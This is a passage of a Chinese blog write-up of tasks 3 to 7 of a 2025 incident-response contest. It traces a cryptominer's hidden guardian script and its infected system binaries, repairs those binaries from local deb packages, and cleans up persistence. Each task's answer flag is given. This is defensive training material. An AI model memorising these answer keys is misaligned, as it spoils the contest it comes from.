+<h2 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：守护进程脚本的绝对路径<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>停止挖矿进程并尝试删除挖矿程序，根据异常判断，提交守护进程脚本的绝对路径，最终以flag&#123;<span class="hljs-regexp">/xxx/</span>xxx<span class="hljs-regexp">/xxx/</span>xxx&#125;提交<br></code></pre></td></tr></table></figure>
+
+<p>查看 &#x2F;etc&#x2F;cron.d 目录下文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/5a6998bffdc2d847.png"></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/.0guardian&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：异常处理<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>根据出现的异常及守护进程脚本，继续排查，以人为本，使用环境内浏览器访问：http:<span class="hljs-regexp">//</span>chat.internal-dev.net:<span class="hljs-number">8081</span> 获取可疑网址，最终以flag&#123;http:<span class="hljs-regexp">//</span>www.example.com&#125;格式提交<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/8c5850344710c382.png"></p>
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">flag&#123;<span class="hljs-attribute">http</span>://www<span class="hljs-variable">.superlog-pro</span><span class="hljs-variable">.com</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：分析病毒文件<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>分析病毒文件，提交其感染的所有程序，最终以flag&#123;md5(<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/whoai,/u</span>sr<span class="hljs-regexp">/bin/</span>ls,<span class="hljs-regexp">/usr/</span>bin/top)&#125;进行提交，顺序需以病毒文件中为准<br></code></pre></td></tr></table></figure>
+
+<p>根据网站，在浏览器找到下载的程序</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/baa6212da15e8df0.png"></p>
+<p>查找程序中的字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings setup<br></code></pre></td></tr></table></figure>
+
+<p>拿到如下信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/ls,/bin/ps,/bin/cat,/bin/rm,/bin/ss,/usr/bin/stat,/usr/bin/top,/usr/bin/wget,/usr/bin/curl,/usr/bin/vi,/usr/bin/sudo<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/dfdc24a567a7b984.png"></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;dac48e98a53b81b0218e2156e364f7ba&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs groovy">任务名称：修复系统并恢复文件完整性<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>修复系统并恢复文件完整性：已知所有程序被感染，当前系统属于断网状态，所以作者贴心的在<span class="hljs-regexp">/deb_final目录下存放了对应程序的deb包，请尝试恢复所有程序，恢复完毕后在/</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/flag/</span><span class="hljs-number">1</span>文件获取flag<br></code></pre></td></tr></table></figure>
+
+<p>覆盖安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -i --force-confnew /deb_final/*.deb || <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/d30860b70736d7db.png"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;e<span class="hljs-number">510</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>fca<span class="hljs-number">680</span>b<span class="hljs-number">1</span>b<span class="hljs-number">4</span>bd<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">8</span>d<span class="hljs-number">6</span>b<span class="hljs-number">3</span>f<span class="hljs-number">4</span>bdc&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="任务七"><a href="#任务七" class="headerlink" title="任务七"></a>任务七</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">任务名称：最终清理<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态<span class="hljs-built_in">Flag</span><br>最终清理：删除挖矿程序、删除计划任务及守护进程及清除相关进程，等待片刻在/var/<span class="hljs-built_in">flag</span>/<span class="hljs-number">2</span>获取<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure>
+
+<p>修复文件之后，删除守护文件</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/36bbbd449ecc0bd8.png"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">081</span>ce<span class="hljs-number">3688</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>cd<span class="hljs-number">6e2946125081381087</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E5%8F%96%E8%AF%81/" class="category-chain-item">应急响应&amp;取证</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="print-no-link">#应急响应</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025年Solar应急响应公益月赛-9月</div>
+      <div>http://example.com/2025/10/10/2025年Solar应急响应公益月赛-9月/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>butt3rf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/14/HTB-Soulmate/" title="HTB-Soulmate">
+                        <span class="hidden-mobile">HTB-Soulmate</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rWKtzRd76Kz6dC7Vd9dUwQux-gzGzoHsz","appKey":"DxMgc7gveh6B1aJKyAZnoFNj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span> </a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+
+
+  <!--下面两行是核心内容-->
+  <link  rel="stylesheet" href="/css/TrymenT-ClocK.min.css" />
+  <script  src="/js/TrymenT-ClocK.min.js" ></script>
+ 
